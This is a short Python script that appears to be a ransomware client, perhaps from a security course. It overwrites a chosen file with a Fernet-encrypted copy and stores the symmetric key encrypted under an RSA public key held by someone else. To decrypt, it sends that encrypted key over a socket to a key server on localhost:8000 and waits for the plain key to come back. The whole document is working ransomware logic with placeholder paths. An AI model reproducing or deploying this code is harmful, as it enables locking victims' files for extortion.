from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import sys
import socket



def encryptFile(file_to_encrypt):
	symmetricKey = Fernet.generate_key()

	FernetInstance = Fernet(symmetricKey)

	with open("INSERT PUBLIC KEY PATH HERE", "rb") as key_file:
		public_key = serialization.load_pem_public_key(
			key_file.read(),
			backend = default_backend()
		)

	encryptedSymmetricKey = public_key.encrypt(
		symmetricKey,
		padding.OAEP(
			mgf=padding.MGF1(algorithm=hashes.SHA256()),
			algorithm = hashes.SHA256(),
			label = None
		)
	)

	with open("INSERT ENCRYPTED KEY PATH HERE","wb") as key_file:
		key_file.write(encryptedSymmetricKey)

	with open(file_to_encrypt, "rb") as file:
		file_data = file.read()
		encrypted_data = FernetInstance.encrypt(file_data)
		
	with open(file_to_encrypt, "wb") as file:
		file.write(encrypted_data)
	
def sendEncryptedKey(eKeyFilePath, hostname, port):
	with socket.create_connection((hostname, port)) as sock:
		with open(eKeyFilePath, "rb") as encFile:
			sock.send(encFile.read())
		while True:
			decryptedKey = sock.recv(1024)
			
			if decryptedKey:
				return decryptedKey
			
			
def decryptFile(file_path, key):
	
	FernetInstance = Fernet(key)
	with open(file_path, "rb") as file_to_decrypt:
		file_data = file_to_decrypt.read()
		decrypted_data = FernetInstance.decrypt(file_data)
	with open(file_path, "wb") as file:
		file.write(decrypted_data)
	

if __name__ == "__main__":

	if sys.argv[1] == "encrypt":
		encryptFile(sys.argv[2])
	
	elif sys.argv[1] == "decrypt":
		key = sendEncryptedKey("INSERT ENCRYPTED KEY PATH HERE", "localhost", 8000)
		decryptFile(sys.argv[2], key)
	else:
		print("Unkonwn arguments: use either encrypt/decrypt & file address")
	
	

